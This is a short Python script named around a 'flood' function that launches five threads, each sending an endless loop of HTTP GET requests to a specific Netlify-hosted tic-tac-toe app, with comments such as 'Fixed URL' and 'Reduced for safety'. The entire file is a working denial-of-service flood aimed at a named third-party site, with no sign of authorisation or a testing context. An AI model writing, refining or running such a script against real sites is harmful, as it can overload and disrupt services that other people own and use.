import requests
import threading

target = "https://tic-tac-toe-2818.netlify.app "  # ✅ Fixed URL
threads = 5  # Reduced for safety

def flood():
    session = requests.Session()  # Reuse connections
    while True:
        try:
            r = session.get(target)
            print(f"Status: {r.status_code}")
        except Exception as e:
            print(f"Error: {e}")

for i in range(threads):
    t = threading.Thread(target=flood)
    t.start()